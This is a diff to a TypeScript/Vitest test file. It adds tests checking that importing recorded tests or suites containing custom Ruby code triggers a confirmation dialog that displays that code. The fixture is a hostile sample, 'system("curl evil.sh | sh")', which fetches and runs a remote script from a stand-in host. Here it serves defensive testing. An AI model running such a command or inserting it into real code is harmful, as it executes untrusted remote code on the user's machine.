@@ -3,7 +3,11 @@ import { mkdtemp, readFile, readdir, rm, writeFile, mkdir } from 'fs/promises'
 import { tmpdir } from 'os'
 import { join } from 'path'
 
-const mockDialog = vi.hoisted(() => ({ showSaveDialog: vi.fn(), showOpenDialog: vi.fn() }))
+const mockDialog = vi.hoisted(() => ({
+  showSaveDialog: vi.fn(),
+  showOpenDialog: vi.fn(),
+  showMessageBox: vi.fn()
+}))
 vi.mock('electron', () => ({
   BrowserWindow: { getFocusedWindow: (): object => ({}) },
   dialog: mockDialog
@@ -42,6 +46,7 @@ beforeEach(async () => {
   appState.projectFramework = 'rspec'
   appState.recorderSettings = { ...DEFAULT_RECORDER_SETTINGS }
   vi.spyOn(persistence, 'persistActiveSuites').mockResolvedValue()
+  mockDialog.showMessageBox.mockReset().mockResolvedValue({ response: 0 })
 })
 afterEach(async () => {
   vi.restoreAllMocks()
@@ -122,6 +127,82 @@ describe('export then import round trips', () => {
   })
 })
 
+describe('importing custom Ruby code', () => {
+  const custom: Step = { id: 'c', kind: 'custom', code: 'system("curl evil.sh | sh")' }
+  const plain: Step[] = [steps[0], steps[1]]
+
+  const importFile = async (fileSteps: Step[]): Promise<Awaited<ReturnType<typeof importTest>>> => {
+    const file = join(dir, 'shared.rb')
+    await writeFile(file, writeExportHeader({ testName: 'Shared', steps: fileSteps }))
+    appState.suites = new Map([['s1', { id: 's1', name: 'S', tests: [] }]])
+    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [file] })
+    return importTest(win, 's1')
+  }
+
+  it('shows the custom code and imports nothing when the user cancels', async () => {
+    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })
+    const res = await importFile([...plain, custom])
+
+    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(1)
+    const box = mockDialog.showMessageBox.mock.calls[0][1]
+    expect(box.message).toBe('This test runs custom Ruby code. Import anyway?')
+    expect(box.detail).toContain('system("curl evil.sh | sh")')
+    expect(box.buttons).toEqual(['Import anyway', 'Cancel'])
+    expect(box.cancelId).toBe(1)
+    expect(box.defaultId).toBe(1)
+    expect(res.success).toBe(false)
+    expect(appState.suites.get('s1')!.tests).toEqual([])
+  })
+
+  it('imports when the user confirms', async () => {
+    const res = await importFile([...plain, custom])
+    expect(res.success).toBe(true)
+    expect(res.test!.steps.at(-1)).toMatchObject({ kind: 'custom', code: custom.code })
+  })
+
+  it('does not ask when the file holds no custom steps', async () => {
+    const res = await importFile(plain)
+    expect(res.success).toBe(true)
+    expect(mockDialog.showMessageBox).not.toHaveBeenCalled()
+  })
+
+  it('asks once for a suite, listing each test that runs custom code', async () => {
+    const suiteDir = join(dir, 'shared-suite')
+    await mkdir(suiteDir)
+    await writeFile(join(suiteDir, 'a.rb'), writeExportHeader({ testName: 'A', steps: [custom] }))
+    await writeFile(join(suiteDir, 'b.rb'), writeExportHeader({ testName: 'B', steps: plain }))
+    await writeFile(
+      join(suiteDir, 'c.rb'),
+      writeExportHeader({ testName: 'C', steps: [{ id: 'c2', kind: 'custom', code: 'puts 2' }] })
+    )
+    mockDialog.showMessageBox.mockResolvedValue({ response: 1 })
+    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [suiteDir] })
+
+    const res = await importSuite(win)
+
+    expect(mockDialog.showMessageBox).toHaveBeenCalledTimes(1)
+    const box = mockDialog.showMessageBox.mock.calls[0][1]
+    expect(box.message).toBe('These tests run custom Ruby code. Import anyway?')
+    expect(box.detail).toContain('A:')
+    expect(box.detail).toContain('C:')
+    expect(box.detail).not.toContain('B:')
+    expect(res.success).toBe(false)
+    expect(appState.suites.size).toBe(0)
+  })
+
+  it('does not ask for a legacy file, whose visible Ruby is what runs', async () => {
+    const legacyDir = join(dir, 'legacy-custom')
+    await mkdir(legacyDir)
+    await writeFile(
+      join(legacyDir, 'old.rb'),
+      '# Test: Old\nbegin\n  some_helper(1)\n  puts "Test \'Old\' passed successfully!"\n'
+    )
+    mockDialog.showOpenDialog.mockResolvedValue({ canceled: false, filePaths: [legacyDir] })
+    expect((await importSuite(win)).success).toBe(true)
+    expect(mockDialog.showMessageBox).not.toHaveBeenCalled()
+  })
+})
+
 describe('readExportHeader', () => {
   it('falls back to the legacy body when the steps JSON is malformed', () => {
     const text =
@@ -144,6 +225,11 @@ describe('readExportHeader', () => {
 
   it('keeps names on one line', () => {
     const header = writeExportHeader({ testName: 'a\nb', suiteName: 'c\r\nd', steps: [] })
-    expect(readExportHeader(header)).toEqual({ testName: 'a b', suiteName: 'c d', steps: [] })
+    expect(readExportHeader(header)).toEqual({
+      testName: 'a b',
+      suiteName: 'c d',
+      steps: [],
+      fromJson: true
+    })
   })
 })
